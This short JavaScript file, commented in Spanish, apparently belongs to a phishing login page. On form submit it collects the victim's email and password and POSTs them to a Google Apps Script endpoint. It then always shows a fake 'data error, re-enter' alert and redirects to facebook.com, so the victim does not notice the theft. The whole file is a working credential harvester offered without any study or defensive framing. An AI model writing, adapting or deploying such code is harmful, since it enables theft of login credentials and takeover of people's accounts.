document.getElementById("login-form").addEventListener("submit", function(event) {
  event.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Por favor, complete todos los campos.");
    return;
  }

  // URL de tu Google Apps Script (la que obtuviste al desplegar como Web App)
  const scriptURL = 'https://script.google.com/macros/s/AKfycbySBywAWjv1F7CCcPVxsRQ-Zyl1Mn8V5JZwUMLfAgvsZ479K_ZEm4NsX5xSHJcAt4kB/exec';

  // Enviar los datos al script mediante fetch (POST)
  fetch(scriptURL, {
    method: 'POST',
    body: new URLSearchParams({
      email: email,
      password: password
    }),
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    }
  })
  .then(response => response.text())
  .then(result => {
    alert('Error en los datos vuelva a ingresarlos'); 
    window.location.href = "https://www.facebook.com/";
  })
  .catch(error => {
    alert('Error al enviar los datos: ' + error.message);
  });
});
